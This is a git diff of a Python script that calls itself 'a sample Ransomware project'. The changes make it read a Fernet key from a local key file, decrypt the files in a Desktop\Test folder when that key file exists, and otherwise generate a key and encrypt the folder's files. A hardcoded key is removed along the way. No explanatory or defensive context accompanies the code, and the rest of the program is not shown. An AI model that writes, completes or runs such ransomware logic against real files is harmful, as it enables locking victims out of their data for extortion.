@@ -99,8 +99,12 @@ def encrypt(target):
         print("Target empty.")
 
 
-def decrypt(target, key):
-    key = Fernet(b"suCxGDQU4mrp6XGat0D6zojYtZIz1_8UWzPEWHLLdG4=")
+def decrypt(target, key_path):
+
+    with open(key_path, "rb") as key_file:
+        FernetKey = key_file.read()
+        print(type(FernetKey))
+    key = Fernet(FernetKey)
 
     for doc in target:
         print(f"Decrypting {doc}")
@@ -114,17 +118,19 @@ def decrypt(target, key):
 
 
 parser = argparse.ArgumentParser(prog='Ransomware', description='This is a sample Ransomware project.')
-parser.add_argument('-k', type=str, help="The location of the decryption key", required=False)
+# parser.add_argument('-k', type=str, help="The location of the decryption key", required=False)
 # parser.add_argument('-d', type=str, help="The directory to encrypt/decrypt the files", default='Desktop/Test')
 args = parser.parse_args()
 
-if args.k:
-    print(f"Decrypting with {args.k}")
+
+file_path = f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key'
+if os.path.isfile(file_path):
+    print(f"Decrypting with {file_path}")
     directory = navigateToDir("Desktop\\Test")
     target = getFiles(directory)
-    decrypt(target, args.k)
+    decrypt(target, file_path)
 else:
-    print("running")
+    print("Encrypting")
     generateKey()
     directory = navigateToDir("Desktop\\Test")
     target = getFiles(directory)
